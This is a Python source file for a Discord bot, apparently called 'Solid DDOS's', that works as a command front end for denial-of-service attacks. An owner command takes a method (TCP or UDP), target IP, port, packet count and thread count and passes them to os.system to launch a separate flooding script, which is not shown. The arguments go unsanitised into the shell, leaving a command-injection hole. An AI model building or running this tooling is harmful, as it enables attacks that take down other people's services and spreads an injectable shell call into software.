import discord
import os
import time
from discord.ext import commands

owners  = [885830821704003614, 795595550850023485]

client = commands.Bot(command_prefix=">", help_command=None)

@client.event
async def on_ready():
    print("Solid DDOS's is Online!")
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f">help"))

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        print("command not found")
    if isinstance(error, commands.MissingRequiredArgument):
        if ctx.command.qualified_name == 'TCP':
            await ctx.send("**>attack TCP IP PORT PACKET THREADS**")
        if ctx.command.qualified_name == 'UDP':
            await ctx.send("**>attack UDP IP PORT PACKET THREADS**")

@client.command()
async def ping(ctx):
    embed=discord.Embed(
        title=f":hourglass: Bot HTTP Ping is {round(client.latency * 1000)}ms",
        color=discord.Colour.red()
    )
    await ctx.reply(embed=embed)

@client.command()
async def attack(ctx, method, ip, port, times, threads):
    if ctx.author.id not in owners:
        await ctx.send(":clown: you dont have permission to attack idiot :clown:")
    else:
        await ctx.send(f":smiling_imp: Sent Attack to {ip}:{port} :smiling_imp:")
        os.system(f"py main.py {method} {ip} {port} {times} {threads}")

@client.command()
async def help(ctx):
    await ctx.send("```\n>ping (show bot ping)\n>methods (show methods)\n>usage (show tutorial)```")

@client.command()
async def usage(ctx):
    await ctx.reply(">attack METHOD IP PORT PACKET THREADS")

@client.command()
async def methods(ctx):
    embed=discord.Embed(
        title="- TCP\n- UDP",
        color=discord.Colour.red()
    )
    await ctx.reply(embed=embed)

client.run("YOUR TOKEN", bot=True)